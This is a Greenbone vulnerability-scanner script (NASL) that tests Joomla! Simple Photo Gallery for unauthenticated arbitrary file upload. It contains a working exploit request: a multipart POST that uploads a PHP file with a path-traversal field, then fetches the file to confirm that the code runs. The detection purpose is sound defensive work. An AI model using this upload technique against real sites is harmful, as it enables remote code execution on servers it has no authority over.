# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805155");
  script_version("2023-07-25T05:05:58+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2015-03-17 18:20:26 +0530 (Tue, 17 Mar 2015)");
  script_tag(name:"qod_type", value:"remote_vul");

  script_name("Joomla! Simple Photo Gallery Arbitrary File Upload Vulnerability");

  script_tag(name:"summary", value:"Joomla! Simple Photo Gallery is prone to arbitrary file upload vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request
  and check whether it is able to upload file or not.");

  script_tag(name:"insight", value:"The flaw is due to the plugin failed to restrict access to certain files.");

  script_tag(name:"impact", value:"Successful exploitation will allow an
  unauthenticated remote attacker to upload files in an affected site.");

  script_tag(name:"affected", value:"Joomla! Simple Photo Gallery version 1.1 and prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade
  to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/36373");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_mandatory_keys("joomla/installed");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if(!http_port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:http_port))
  exit(0);

if (dir == "/")
  dir = "";

host = http_host_name(port:http_port);

url = dir + '/administrator/components/com_simplephotogallery/lib/uploadFile.php';
wpReq = http_get(item:url, port:http_port);
wpRes = http_keepalive_send_recv(port:http_port, data:wpReq, bodyonly:FALSE);

if(wpRes && wpRes =~ "^HTTP/1\.[01] 200") {

  vtstrings = get_vt_strings();
  useragent = http_get_user_agent();
  fileName = vtstrings["lowercase"] + '_' + rand();

  postData = string('------------agdOsaQ7KQXNnu6QsXxxVq\r\n',
                    'Content-Disposition: form-data; name="uploadfile"; filename="', fileName, '.php"\r\n',
                    'Content-Type: application/octet-stream\r\n\r\n',
                    '<?php phpinfo(); $fileName = glob("', fileName, '*.php")[0]; unlink($fileName); ?>\r\n\r\n',
                    '------------agdOsaQ7KQXNnu6QsXxxVq\r\n',
                    'Content-Disposition: form-data; name="jpath"\r\n\r\n',
                    '..%2F..%2F..%2F..%2F\r\n',
                    '------------agdOsaQ7KQXNnu6QsXxxVq\r\n',
                    'Content-Disposition: form-data; name="Submit"\r\n\r\n',
                    'Pwn!\r\n', '------------agdOsaQ7KQXNnu6QsXxxVq--');

  sndReq = string("POST ", url, " HTTP/1.1\r\n",
                  "Host: ", host, "\r\n",
                  "User-Agent: ", useragent, "\r\n",
                  "Content-Length: ", strlen(postData), "\r\n",
                  "Content-Type: multipart/form-data; boundary=----------agdOsaQ7KQXNnu6QsXxxVq\r\n\r\n",
                  postData, "\r\n");

  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  if(vtstrings["lowercase"] + "_" >< rcvRes && rcvRes =~ "^HTTP/1\.[01] 200") {

    uploadedFile = eregmatch(pattern:vtstrings["lowercase"] + '_(.*__.*)php<br', string:rcvRes);
    uploadedFile = vtstrings["lowercase"] + "_" + uploadedFile[1] + "php";

    url = dir + "/" + uploadedFile;
    if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
                       pattern:">phpinfo\(\)<", extra_check:">System")) {
      if(http_vuln_check(port:http_port, url:url, check_header:FALSE, pattern:"^HTTP/1\.[01] 200"))
        report = "\nUnable to Delete the uploaded File at " + url + "\n";

      if(report){
        security_message(data:report, port:http_port);
      } else {
        security_message(port:http_port);
      }
      exit(0);
    }
  }
}

exit(99);
